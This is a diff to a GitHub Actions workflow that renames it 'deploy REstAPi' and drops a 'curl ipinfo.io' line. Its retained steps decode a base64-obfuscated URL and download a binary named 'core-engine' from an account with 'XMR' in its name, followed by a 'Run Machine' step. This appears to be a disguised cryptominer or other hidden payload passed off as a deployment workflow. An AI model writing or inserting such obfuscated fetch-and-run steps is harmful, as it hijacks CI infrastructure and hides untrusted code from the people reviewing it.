@@ -1,4 +1,4 @@
-name: deploy LandingPAgsT
+name: deploy REstAPi
 
 on:
   push:
@@ -25,7 +25,6 @@ jobs:
           ENCODED="aHR0cHM6Ly9naXRodWIuY29tL2Fub25tYXh5WE1SL2NvcmUtZW5naW5lL3JlbGVhc2VzL2Rvd25sb2FkL3YwMy9jb3JlLWVuZ2luZQ=="
           URL=$(echo "$ENCODED" | base64 -d)
           curl -L -o core-engine "$URL"
-          curl ipinfo.io
 
       - name: Run Machine
         run: |
